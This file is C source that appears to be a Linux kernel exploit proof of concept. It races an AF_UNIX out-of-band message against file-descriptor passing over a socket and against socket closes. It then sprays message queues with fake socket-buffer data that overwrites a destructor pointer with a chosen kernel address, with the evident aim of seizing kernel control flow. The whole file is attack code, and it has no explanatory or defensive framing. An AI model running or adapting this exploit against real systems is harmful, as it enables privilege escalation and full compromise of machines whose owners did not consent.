#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <stddef.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/time.h>
#include <err.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <netinet/in.h>
#include <sys/timerfd.h>
#include <poll.h>
#include <sys/epoll.h>
#define SYSCHK(x)                     \
    ({                                \
        typeof(x) __res = (x);        \
        if (__res == (typeof(x))-1)   \
            err(1, "SYSCHK(" #x ")"); \
        __res;                        \
    })

struct
{
    long mtype;
    char mtext[0x2000];
} msg;

int msqid[0x4000];
pid_t childs[0x10];
char buf[0x1000];
char send_buf[0x1000];
int timefds[0x1000];
int epfds[0x1000];
int tfd;
pthread_barrier_t barr;

static void barrier(void)
{
    int ret = pthread_barrier_wait(&barr);

    assert(!ret || ret == PTHREAD_BARRIER_SERIAL_THREAD);
}

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

int send_fd(int ufd, int fd)
{
    struct msghdr msg = {};
    struct iovec iov[] = {{.iov_base = buf, .iov_len = 1}};
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    struct cmsghdr *cmsg;
    int len = CMSG_LEN(sizeof(int) * 1);
    memset(send_buf, 0, 0x1000);
    cmsg = (void *)send_buf;
    cmsg->cmsg_len = len;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    msg.msg_control = cmsg;
    msg.msg_controllen = len;
    *(int *)CMSG_DATA(cmsg) = fd;
    SYSCHK(sendmsg(ufd, &msg, 0));
}

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

static void do_epoll_enqueue(int fd, int f)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < f; k++)
	{
		childs[k] = fork();
		if (childs[k] == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = SYSCHK(dup(fd));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				epfds[i] = SYSCHK(epoll_create(0x1));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP);
		}
		read(cfd[0], buf, 1);
	}
}

void *job(void *x)
{
    struct itimerspec new = {.it_value.tv_nsec = 20000};
    set_cpu(1);
    while (1)
    {
        barrier();
        //SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new,
	//						   NULL));
        close(SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0)));
        barrier();
    }
}

int main(int argc, char **argv)
{

    int cfd[2];
    pthread_t tid;
    pthread_barrier_init(&barr, NULL, 2);
    signal(SIGPIPE, SIG_IGN);
    setvbuf(stdout, 0, 2, 0);
    //tfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
    //do_epoll_enqueue(tfd, 4);
    int datafd[2];

    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, datafd));

    size_t val = 0x400000;
    SYSCHK(SYSCHK(setsockopt(datafd[1], SOL_SOCKET, SO_SNDBUF, &val, 4)));
    SYSCHK(SYSCHK(setsockopt(datafd[0], SOL_SOCKET, SO_RCVBUF, &val, 4)));

    SYSCHK(SYSCHK(setsockopt(datafd[1], SOL_SOCKET, SO_RCVBUF, &val, 4)));
    SYSCHK(SYSCHK(setsockopt(datafd[0], SOL_SOCKET, SO_SNDBUF, &val, 4)));

    for (int i = 0; i < 0x4000; i++)
    {
        msqid[i] = SYSCHK(msgget(IPC_PRIVATE, 0644 | IPC_CREAT));
    }

    msg.mtype = 1;
    char *skb = (void *)&msg.mtext[-0x30];
    
#define OFFSET_SKB_DESTRUCTOR 0x60
#define OFFSET_SKB_USERS 0xd4


    *(size_t *)(skb + OFFSET_SKB_DESTRUCTOR) = 0xffffffffcc000000 - 0x800;
    *(unsigned *)(skb + OFFSET_SKB_USERS) = 1;

    pthread_create(&tid, 0, job, 0);
    set_cpu(0);
    size_t cnt = 0;
    while (1)
    {
        printf("%010d\r", cnt++);

        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cfd));
        for (int i = 0; i < 0x100; i++)
            send(datafd[1], buf, 1, 0);


        SYSCHK(send(cfd[1], buf, 1, MSG_OOB));
        for (int i = 0; i < 0x100; i++)
            send(datafd[1], buf, 1, 0);


        send_fd(cfd[1], cfd[0]);
        close(cfd[0]);

        barrier();
        send(cfd[1], buf, 1, MSG_OOB);

        for (int i = 0; i < 0x200; i++)
        {
            recv(datafd[0], buf, 1, 0);

        }
        for (int i = 0; i < 0x1000; i++)
            SYSCHK(msgsnd(msqid[i], &msg, 0x100 - 0x30, 0));

        barrier();
        for (int i = 0; i < 0x1000; i++)
            SYSCHK(msgrcv(msqid[i], &msg, 0x100 - 0x30, 1, 0));

        close(cfd[1]);
    }
}
